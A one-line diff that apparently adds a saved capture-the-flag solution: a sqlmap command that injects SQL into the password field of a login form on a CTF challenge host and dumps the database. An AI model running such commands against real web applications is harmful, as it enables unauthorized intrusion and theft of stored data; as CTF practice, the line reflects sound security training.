@@ -1,0 +1,1 @@
+python2.7 sqlmap.py -u "http://hackyou-web200.ctf.su/" --data "login=admin&password=admin*" --dump
